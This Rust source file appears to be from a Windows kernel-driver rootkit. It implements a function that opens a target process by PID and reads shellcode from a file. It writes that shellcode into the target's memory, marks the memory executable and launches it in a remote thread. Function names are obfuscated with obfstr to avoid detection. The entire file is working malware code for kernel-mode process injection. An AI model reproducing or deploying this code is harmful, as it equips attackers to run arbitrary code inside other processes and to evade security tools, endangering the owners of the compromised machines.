#![allow(non_snake_case)]

use {
    crate::{
        includes::{MmCopyVirtualMemory, ZwCreateThreadExType, ZwProtectVirtualMemoryType}, 
        process::Process, 
        utils::{find_zw_function, read_file, InitializeObjectAttributes}
    },
    core::{
        ffi::c_void, ptr::null_mut
    }, 
    obfstr::obfstr, shared::structs::TargetInjection, 
    wdk_sys::{
        ntddk::{
            IoGetCurrentProcess, ZwAllocateVirtualMemory, ZwOpenProcess, ZwClose
        },
        _MODE::KernelMode, *
    }
};

pub struct Injection;

impl Injection {
    /// Injection Shellcode in Thread.
    ///
    /// # Parameters
    /// - `target`: The identifier of the target process (PID) to injection shellcode.
    ///
    /// # Return
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    pub unsafe fn injection_thread(target: *mut TargetInjection) -> NTSTATUS {
        let pid = (*target).pid;
        let path = &(*target).path;
        let mut h_process: HANDLE = null_mut();
        let zw_thread_addr = match find_zw_function(obfstr!("NtCreateThreadEx")) {
            Some(addr) => addr as *mut c_void,
            None => return STATUS_UNSUCCESSFUL
        };
        let zw_protect_addr = match find_zw_function(obfstr!("NtProtectVirtualMemory")) {
            Some(addr) => addr as *mut c_void,
            None => return STATUS_UNSUCCESSFUL
        };

        let target_eprocess = match Process::new(pid) {
            Some(p) => p,
            None => return STATUS_UNSUCCESSFUL,
        };
        let mut object_attributes = InitializeObjectAttributes(None, 0, None, None, None);
        let mut client_id = CLIENT_ID {
            UniqueProcess: pid as _,
            UniqueThread: null_mut(),
        };

        let mut status = ZwOpenProcess(
            &mut h_process,
            PROCESS_ALL_ACCESS,
            &mut object_attributes,
            &mut client_id,
        );
        if !NT_SUCCESS(status) {
            log::error!("ZwOpenProcess Failed With Status: {status}");
            return status;
        }

        let shellcode = match read_file(path) {
            Ok(buffer) => buffer,
            Err(error) => return error
        };
        let mut base_address = null_mut();
        let mut region_size = shellcode.len() as u64;
        status = ZwAllocateVirtualMemory(
            h_process,
            &mut base_address,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if !NT_SUCCESS(status) {
            log::error!("ZwAllocateVirtualMemory Failed With Status: {status}");
            ZwClose(h_process);
            return status;
        }

        let mut result_number = 0;
        MmCopyVirtualMemory(
            IoGetCurrentProcess(),
            shellcode.as_ptr() as _,
            target_eprocess.e_process,
            base_address,
            shellcode.len() as u64,
            KernelMode as i8,
            &mut result_number,
        );
        
        let ZwProtectVirtualMemory = core::mem::transmute::<_, ZwProtectVirtualMemoryType>(zw_protect_addr);
        let mut old_protect = 0;
        status = ZwProtectVirtualMemory(
            h_process,
            &mut base_address,
            &mut region_size,
            PAGE_EXECUTE_READ,
            &mut old_protect
        );
        if !NT_SUCCESS(status) {
            log::error!("ZwProtectVirtualMemory Failed With Status: {status}");
            ZwClose(h_process);
            return status;
        }

        let ZwCreateThreadEx = core::mem::transmute::<_, ZwCreateThreadExType>(zw_thread_addr);
        let mut h_thread = null_mut();
        let mut obj_attr  = InitializeObjectAttributes(None, 0, None, None, None);

        status = ZwCreateThreadEx(
            &mut h_thread,
            THREAD_ALL_ACCESS,
            &mut obj_attr,
            h_process,
            core::mem::transmute(base_address),
            null_mut(),
            0,
            0,
            0,
            0,
            null_mut()
        );
        if !NT_SUCCESS(status) {
            log::error!("ZwCreateThreadEx Failed With Status: {status}");
            ZwClose(h_process);
            return status;
        }

        ZwClose(h_process);
        ZwClose(h_thread);

        STATUS_SUCCESS
    }
}
